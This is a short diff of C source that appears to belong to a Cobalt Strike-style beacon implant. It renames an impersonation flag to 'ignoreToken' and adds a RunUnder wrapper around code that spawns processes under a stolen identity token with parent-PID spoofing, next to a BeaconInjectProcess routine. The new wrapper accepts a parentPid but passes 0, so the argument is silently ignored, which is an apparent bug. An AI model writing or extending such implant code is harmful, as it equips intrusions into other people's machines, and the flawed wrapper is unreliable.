@@ -904,7 +904,7 @@ typedef struct _RUN_UNDER_CONFIG
 	STARTUPINFO* startupInfo;
 	PROCESS_INFORMATION* processInfo;
 	int creationFlags;
-	BOOL toggleImpersonation;
+	BOOL ignoreToken;
 } RUN_UNDER_CONFIG;
 
 void ProcThreadAttributeListDestroy(LPVOID lpAttributeList)
@@ -1087,7 +1087,7 @@ BOOL SpawnProcess(RUN_UNDER_CONFIG* execution)
 {
 	int lastError;
 
-	if (!gIdentityToken || execution->toggleImpersonation)
+	if (!gIdentityToken || execution->ignoreToken)
 	{
 		if (!CreateProcessA(
 			NULL,
@@ -1208,6 +1208,12 @@ BOOL RunUnder_(RUN_UNDER_CONFIG* runUnderConfig, int parentPid)
 	ProcThreadAttributeListDestroy(lpAttributeList);
 
 	return result;
+}
+
+BOOL RunUnder(char* cmd, int cmdLength, STARTUPINFO* startupInfo, PROCESS_INFORMATION* processInfo, int creationFlags, BOOL ignoreToken, int parentPid)
+{
+	RUN_UNDER_CONFIG runUnderConfig = { cmd, cmdLength, startupInfo, processInfo, creationFlags, ignoreToken };
+	return RunUnder_(&runUnderConfig, 0);
 }
 
 void BeaconInjectProcess(HANDLE hProcess, int pid, char* payload, int p_len, int p_offset, char* arg, int a_len)
